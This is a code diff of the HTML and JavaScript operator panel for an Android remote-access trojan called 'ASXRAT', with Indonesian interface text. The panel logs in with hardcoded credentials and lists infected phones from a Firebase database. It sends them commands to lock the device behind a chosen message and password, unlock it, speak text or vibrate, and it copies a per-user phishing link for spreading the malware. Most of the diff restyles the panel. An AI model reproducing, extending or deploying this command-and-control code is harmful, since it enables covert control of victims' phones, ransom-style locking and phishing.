@@ -7,31 +7,58 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --red: #ff0000; --bg: #000000; --card: #0d0d0d; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
+        :root { --red: #ff0000; --bg: #000000; --card: #111111; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
-        #auth { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .banner-img { width: 100%; max-width: 450px; height: auto; min-height: 150px; object-fit: cover; border: 2px solid var(--red); border-bottom: none; border-radius: 15px 15px 0 0; box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); display: block; }
-        .login-card { background: var(--card); padding: 25px; border-radius: 0 0 15px 15px; border: 2px solid var(--red); width: 85%; max-width: 450px; text-align: center; box-shadow: 0 10px 25px rgba(255, 0, 0, 0.3); margin-top: -2px; }
+        #auth { width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; }
+
+        /* BANNER TENGKORAK API - FULL MELINTANG */
+        .banner-img { 
+            width: 100%; 
+            height: 150px; 
+            object-fit: cover; 
+            border: 2px solid var(--red);
+            border-bottom: none;
+            border-radius: 15px 15px 0 0;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
+            display: block;
+        }
+
+        /* KOTAK LOGIN NEMPEL PRESISI */
+        .login-card { 
+            background: var(--card); 
+            padding: 25px; 
+            border: 2px solid var(--red); 
+            border-top: 1px solid #333;
+            border-radius: 0 0 15px 15px; 
+            width: 100%; 
+            text-align: center; 
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
+            box-sizing: border-box;
+            margin-top: -1px; 
+        }
         
-        input, select { width: 90%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; }
-        .btn-main { background: var(--red); color: #fff; border: none; padding: 14px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        .welcome-text { font-size: 10px; color: #eee; margin-bottom: 20px; line-height: 1.6; letter-spacing: 1px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; box-sizing: border-box; }
+        .btn-main { background: var(--red); color: #fff; border: none; padding: 14px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; box-shadow: 0 0 15px rgba(255, 0, 0, 0.5); }
         
-        #dash { display: none; padding: 15px; max-width: 550px; margin: auto; }
+        /* DASHBOARD SAKTI */
+        #dash { display: none; width: 95%; max-width: 500px; padding: 20px 0; margin-top: 20px; }
         .target-card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--red); }
         .control-group { background: #000; padding: 10px; border-radius: 8px; border: 1px solid #222; margin-top: 10px; }
         .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; }
-        .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 12px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 10px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="auth">
-        <img src="https://drive.google.com/uc?export=view&id=1vBE16nPKAsIaaKAuUMYg6GgP6Ue28_k7" class="banner-img" onerror="this.src='https://via.placeholder.com/450x150/000/f00?text=ASXRAT+V2'">
+        <img src="https://drive.google.com/uc?export=view&id=1vBE16nPKAsIaaKAuUMYg6GgP6Ue28_k7" class="banner-img">
+        
         <div class="login-card">
-            <div style="font-size:11px; color:#eee; margin-bottom:20px;">
+            <div class="welcome-text">
                 HELO BRO SELAMAT DATANG DI APK ASXRAT SEMOGA BETAH<br><br>
-                <span style="color:var(--red); font-weight:bold;">POWERED BY : ELVOXI</span><br>
+                <span style="color:var(--red); font-weight: bold;">POWERED BY : ELVOXI</span><br>
                 CONTACT TELEGRAM : @Elvoxi_Reals01😘
             </div>
             <input type="text" id="email-input" placeholder="EMAIL ADDRESS...">
@@ -44,14 +71,7 @@
         <div style="padding:15px; border:1px solid var(--red); border-radius:10px; background:#050505; text-align:center; margin-bottom:20px;">
             <b id="user-display" style="color:var(--red); font-size:18px;">...</b><br>
             <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000;">📋 COPY MY LINK PHISING</button>
-            <div id="creation-tools" style="display:none; margin-top:20px; border-top:1px dashed #444; padding-top:15px;">
-                <input type="text" id="new-email" placeholder="NEW EMAIL...">
-                <input type="text" id="new-key" placeholder="NEW KEY...">
-                <button onclick="generateUser()" class="btn-main">ACTIVATE ACCOUNT</button>
-            </div>
         </div>
-
-        <h4 style="color:var(--red); text-align:center; letter-spacing:3px;">📡 LIVE TARGETS</h4>
         <div id="list"></div>
     </div>
 
@@ -76,7 +96,6 @@
         const key = document.getElementById('key-input').value;
         if(mail === "elvoxi@gmail.com" && key === "elvoxi122") {
             currentKey = "elvoxi122";
-            document.getElementById('creation-tools').style.display = 'block';
             start();
         } else {
             db.ref('asxrat/accounts/' + key).once('value', (s) => {
@@ -104,14 +123,14 @@
                         <div class="target-card">
                             <b style="color:var(--red)">📱 ${d.model}</b>
                             <div class="control-group">
-                                <input type="text" id="lock-msg-${child.key}" placeholder="Pesan Lock (Patah-Patah)..." style="font-size:10px;">
-                                <input type="text" id="lock-pw-${child.key}" placeholder="Set Password Unlock..." style="font-size:10px;">
+                                <input type="text" id="lock-msg-${child.key}" placeholder="Pesan Lock..." style="font-size:10px; margin-bottom:5px;">
+                                <input type="text" id="lock-pw-${child.key}" placeholder="Set PW Unlock..." style="font-size:10px;">
                                 <div class="btn-grid">
                                     <button class="btn-rat" onclick="sendLock('${child.key}')" style="color:red">🔒 LOCK HP</button>
                                     <button class="btn-rat" onclick="cmd('${child.key}', 'unlock')" style="color:green">🔓 UNLOCK</button>
                                 </div>
                             </div>
-                            <input type="text" id="tts-${child.key}" placeholder="Teks suara..." style="width:100%; margin-top:10px;">
+                            <input type="text" id="tts-${child.key}" placeholder="Ketik suara..." style="width:100%; margin-top:10px;">
                             <div class="btn-grid">
                                 <button class="btn-rat" onclick="sendTTS('${child.key}')">🗣️ SPEAK</button>
                                 <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 VIBRATE</button>
@@ -137,18 +156,11 @@
         db.ref(`mario/commands/${id}`).set({ action: 'speak_text', text: txt, time: Date.now() });
     }
 
-    function generateUser() {
-        const mail = document.getElementById('new-email').value;
-        const key = document.getElementById('new-key').value;
-        db.ref('asxrat/accounts/' + key).set({ email: mail, role: "USER" });
-        alert("ACCOUNT SUCCESS!");
-    }
-
     function salinLink() {
         const encoded = btoa(currentKey);
         const full = linkPhising + "?id=" + encoded;
         navigator.clipboard.writeText(full);
-        alert("LINK PHISING DISALIN!");
+        alert("LINK DISALIN!");
     }
 </script>
 </body>
